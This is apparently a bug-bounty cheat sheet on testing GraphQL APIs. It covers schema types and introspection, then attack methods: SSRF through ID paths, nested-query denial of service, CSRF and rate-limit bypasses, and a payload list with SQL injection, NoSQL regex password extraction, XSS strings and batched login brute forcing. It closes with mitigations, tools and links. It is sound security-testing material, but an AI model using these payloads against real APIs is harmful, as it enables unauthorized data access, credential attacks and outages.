## Overview
GraphQL is a query language designed to build client applications by providing an intuitive and flexible syntax for describing data requirements and interactions. It uses a declarative approach to fetching data, allowing clients to specify exactly what data they need from the API. Unlike REST APIs with multiple endpoints, GraphQL provides a single endpoint for data retrieval.

![GraphQL vs REST](img/graphql-vs-rest.jpeg)

GraphQL servers use a schema to define the shape of available data, including types and fields populated from back-end stores. The schema specifies supported queries and mutations.

## Schema Types
GraphQL schemas define a hierarchy of types:

### Scalar Types
Scalar types resolve to concrete data. Default scalars include:
- `Int`: Signed 32-bit integer
- `Float`: Signed double-precision floating-point value
- `String`: UTF-8 character sequence
- `Boolean`: True or false
- `ID`: Unique identifier (serialized as `String`), not intended to be human-readable

Custom scalar types can be created for specific use cases.

### Object Types
Most types are object types, containing fields with their own types. Objects can reference each other.

### Query Types
The `Query` type defines top-level entry points for read operations. Fields execute in parallel.

Example:
```graphql
query {
  allUsers {
    name
  }
}

query {
  user(id: 1337) {
    name
  }
}
```

### Mutation Types
The `Mutation` type defines entry points for write operations. Fields execute sequentially (optional type).

Example:
```graphql
mutation {
  createUser(name: "User", email: "user@website.com") {
    id
    name
    email
  }
}
```

### Subscription Types
Used for real-time notifications via connections like WebSockets (optional type).

Example:
```graphql
subscription {
  newUser {
    name
    email
  }
}
```

### Input Types
Special object types for hierarchical arguments to fields. Fields can be scalars, enums, or other inputs.

### Enum Types
Restrict values to a predefined list, useful for options.

### Union Types
Declare included object types. Fields can return any type in the union (all must be objects).

### Interface Types
Specify fields that multiple object types must implement. Fields can return implementing types.

## Introspection
GraphQL supports introspection to query supported operations. Fetch with:

```graphql
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

### Reading Introspection Schema
- `queryType`, `mutationType`, `subscriptionType`: Names of fields listing supported queries.
- `types`: All variables and queries.
- `directives`: Supported directives.

Example schema snippet:
```json
{
  "data": {
    "__schema": {
      "queryType": { "name": "QueryRoot" },
      "types": [
        { "name": "User", "kind": "OBJECT", "fields": [{ "name": "name", "type": { "name": "String", "kind": "SCALAR" } }] },
        { "name": "QueryRoot", "kind": "OBJECT", "fields": [{ "name": "allUsers", "type": { "kind": "LIST", "ofType": { "name": "User" } } }] }
      ]
    }
  }
}
```

If introspection is disabled, use Clairvoyance to recover the schema.

To test for introspection misconfiguration:
1. Intercept HTTP request to server.
2. Replace POST content/query with introspection query (e.g., `query={__schema { types { name kind description fields { name } } } }`).
3. Visualize schema (e.g., paste to GraphQL Voyager) for juicy API calls.
4. Craft and test calls.

Example URL for testing:
```
example.com/graphql?query={__schema%20{%0atypes%20{%0aname%0akind%0adescription%0afields%20{%0aname%0a}%0a}%0a}%0a}
```

## Exploitation Methods
### Abuse as API Gateway (SSRF)
GraphQL resolvers may act as gateways, forwarding unvalidated parameters to back-ends, enabling SSRF.

Checks/Steps:
1. Identify queries using IDs or strings (e.g., `userByID(id: ID!)`).
2. Craft paths in IDs (e.g., `id: "1337/friends/1"`).
3. Send batched queries to probe internal endpoints.

Example:
```graphql
{
  firstFriend: userByID(id: "1337/friends/1") { id name }
  secondFriend: userByID(id: "1337/friends/2") { id name }
}
```

### Abuse Engine Vulnerabilities
Determine engine with fingerprinting, then exploit known issues.

Checks/Steps:
1. Use graphw00f to fingerprint.
2. Research CVEs or misconfigs for identified engine.

### Broken Access Control
Access control is implemented in resolvers; test for bypasses like in REST.

Checks/Steps:
1. Introspect schema for sensitive fields/objects.
2. Attempt access to restricted data (e.g., private programs, delete actions).
3. Use tools like AutoGraphQL to automate testing.

Reports:
- Confidential data accessible via GraphQL: https://hackerone.com/reports/489146
- Insufficient type check allowing deletes: https://gitlab.com/gitlab-org/gitlab/-/issues/239348
- Maintainer delete repository: https://gitlab.com/gitlab-org/gitlab/-/issues/215703

### Denial of Service (Nested Queries)
Unlimited query depth can cascade database requests.

Checks/Steps:
1. Build deeply nested queries.
2. Send and monitor for performance impact or crashes.

Example:
```graphql
query {
  posts {
    title
    comments {
      comment
      user {
        comments {
          user {
            comments {
              comment
              user {
                # Continue nesting
              }
            }
          }
        }
      }
    }
  }
}
```

### Excessive Errors (Info Leak)
Error messages may reveal sensitive details.

Checks/Steps:
1. Fuzz parameters to trigger errors.
2. Analyze responses for paths, code snippets, queries.

### GraphQL Injection
Injections possible if back-end queries use unvalidated inputs.

Checks/Steps:
1. Test mutations/queries with injection payloads (SQL, NoSQL, OS command).
2. Check for data exfil or bypasses.

### Information Disclosure
APIs may expose private/debug data.

Checks/Steps:
1. Query for hidden fields (e.g., user counts, whitelists).
2. Test with low-priv accounts.

Reports:
- Team object discloses whitelisted hackers: https://hackerone.com/reports/342978
- Exposes participants in private programs: https://hackerone.com/reports/380317

### XSS in GraphQL
Reflected inputs may lead to XSS.

Checks/Steps:
1. Inject scripts in parameters (e.g., IDs).
2. Test endpoints for rendering.

Examples:
```
http://localhost:4000/example-1?id=%3C/script%3E%3Cscript%3Ealert('I%20%3C3%20GraphQL.%20Hack%20the%20Planet!!')%3C/script%3E%3Cscript%3E
http://localhost:4000/example-3?id=%3C/script%3E%3Cscript%3Ealert('I%20%3C3%20GraphQL.%20Hack%20the%20Planet!!')%3C/script%3E%3Cscript%3E
```

## Bypasses
### CSRF Bypass
- **Change Content-Type**: Switch from `application/json` to `application/x-www-form-urlencoded`.
  Example:
  ```
  POST /api/graphql HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  query=mutation...
  ```
- **Change HTTP Method**: Use GET instead of POST.
  Report: https://hackerone.com/reports/1122408

### Rate Limit Bypass
Batch multiple operations in one request.

Example:
```graphql
mutation { login(input: { user:"a", password:"password" }) { success } }
mutation { login(input: { user:"b", password:"password" }) { success } }
# Continue for more
```

## Payloads
1. Basic Introspection: `{__schema { types { name kind description fields { name } } } }`
2. Full Introspection: Use the detailed query from Introspection section.
3. SSRF Path Traversal: `userByID(id: "1337/friends/1") { id name }`
4. Nested DoS: Deeply nested fields as in DoS example.
5. SQL Injection: `login(input: { user: "admin", password: "password' or 1=1 -- -" }) { success }`
6. NoSQL Regex: `users(search: "{password: { $regex: \".*\"}, name:Admin }") { id name password }`
7. XSS Script: `?id=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E%3Cscript%3E`
8. Batch Mutation: Multiple logins as in rate limit bypass.
9. User Query Bypass: `allUsers(id: 1337) { name }`
10. Subscription Test: `subscription { newUser { name email } }`

## Higher Impact
- SSRF to internal services for data exfil or RCE.
- Broken access control leading to deletes or unauthorized reads (e.g., repo deletion).
- DoS via nesting, causing outages.
- Injections escalating to full DB compromise.
- Info disclosure of user/program metadata in bug bounties.

## Mitigations
- Disable introspection in production or restrict to authorized users.
- Implement query depth/complexity limits to prevent DoS.
- Validate/sanitize inputs in resolvers to avoid injections/SSRF.
- Enforce CSRF tokens; reject unexpected Content-Types/Methods.
- Rate limit batched queries.
- Use least-privilege access in back-ends.
- Mask error details in responses.

## Tools
- GraphQL Voyager: https://apis.guru/graphql-voyager/
- GraphQL Cheatsheet: https://devhints.io/graphql
- AutoGraphQL: https://graphql-dashboard.herokuapp.com/ (Demo: https://www.youtube.com/watch?v=JJmufWfVvyU)
- graphw00f: https://github.com/dolevf/graphw00f (Fingerprinting)
- InQL: https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f (Introspection Scanner)
- Graphicator: https://github.com/cybervelia/graphicator (Scraper/Extractor)
- Clairvoyance: https://github.com/nikitastupin/clairvoyance (Schema recovery if disabled)
- InQL: https://github.com/doyensec/inql
- GraphQLmap: https://github.com/swisskyrepo/GraphQLmap

## Videos
- GraphQL Video: https://www.youtube.com/watch?v=GlvNwhq-uBg (InsiderPhd)
- REST in Peace: Abusing GraphQL: https://www.youtube.com/watch?v=NPDp7GHmMa0 (LevelUp 0x05)

## Blogs
- Exploit GraphQL: https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/
- Hacking GraphQL Part 1: https://infosecwriteups.com/hacking-graphql-for-fun-and-profit-part-1-understanding-graphql-basics-72bb3dd22efa
- Hacking GraphQL Part 2: https://infosecwriteups.com/hacking-graphql-for-fun-and-profit-part-2-methodology-and-examples-5992093bcc24
- That single GraphQL issue: https://blog.doyensec.com/2021/05/20/graphql-csrf.html (Doyensec)
- Reverse Engineer GraphQL API: https://swizec.com/blog/reverse-engineer-a-graphql-api-to-automate-love-notes-codewithswiz-24
- Exploiting GraphQL: https://blog.assetnote.io/2021/08/29/exploiting-graphql/ (Assetnote)
- GraphQL Resources Thread: https://twitter.com/holybugx/status/1441460070387261440?s=21 (HolyBugx)
- GraphQL Test Cases: https://anmolksachan.github.io/graphql/
- Practical GraphQL Attack Vectors: https://jondow.eu/practical-graphql-attack-vectors/

## Labs
- Damn-Vulnerable-GraphQL-Application: https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application

## References
- GraphQL Specification: https://spec.graphql.org/
- Public GraphQL APIs: https://github.com/APIs-guru/graphql-apis
- Apollo Docs: Schema Basics: https://www.apollographql.com/docs/apollo-server/schema/schema/